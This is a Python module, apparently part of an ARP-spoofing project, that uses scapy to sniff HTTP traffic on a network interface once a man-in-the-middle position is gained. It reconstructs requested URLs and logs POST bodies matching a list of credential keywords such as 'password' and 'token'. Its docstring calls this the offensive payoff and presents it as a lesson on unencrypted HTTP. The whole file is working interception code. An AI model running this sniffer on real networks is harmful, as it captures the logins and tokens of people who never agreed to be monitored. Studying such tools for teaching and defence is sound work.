"""HTTP packet sniffer: capture URLs and possible plaintext credentials.

The offensive payoff of the MITM: once spoof.py has made you the man in the
middle, sniff shows the unencrypted HTTP traffic flowing through you. HTTPS
traffic stays encrypted - which is precisely the lesson this demonstrates.
"""

import logging

import scapy.all as scapy
from scapy.layers import http

log = logging.getLogger("arpspoofer")

# If any of these appear in a POST body, the request likely carries credentials.
CREDENTIAL_KEYWORDS = (
    "user",
    "username",
    "uname",
    "login",
    "email",
    "pass",
    "password",
    "pwd",
    "passwd",
    "token",
)


def get_url(packet):
    """Reconstruct the requested URL from an HTTP request packet."""
    layer = packet[http.HTTPRequest]
    host = layer.Host.decode(errors="ignore") if layer.Host else ""
    path = layer.Path.decode(errors="ignore") if layer.Path else ""
    return host + path


def get_credentials(packet):
    """Return the raw body if it looks like it contains credentials, else None."""
    if not packet.haslayer(scapy.Raw):
        return None
    load = packet[scapy.Raw].load.decode(errors="ignore")
    lowered = load.lower()
    if any(keyword in lowered for keyword in CREDENTIAL_KEYWORDS):
        return load
    return None


def process(packet):
    """Scapy callback: log each HTTP request and any likely credentials."""
    if not packet.haslayer(http.HTTPRequest):
        return
    method = packet[http.HTTPRequest].Method
    method = method.decode(errors="ignore") if method else "?"
    log.info("HTTP %s http://%s", method, get_url(packet))

    credentials = get_credentials(packet)
    if credentials:
        log.warning("Possible plaintext credentials >> %s", credentials)


def run(iface=None, count=0):
    """Sniff HTTP traffic on an interface. count=0 means run until Ctrl+C."""
    log.info("Sniffing HTTP on %s (Ctrl+C to stop)...", iface or "default iface")
    try:
        scapy.sniff(iface=iface, store=False, prn=process, count=count)
    except KeyboardInterrupt:
        pass
    log.info("Stopped sniffing.")
    return 0
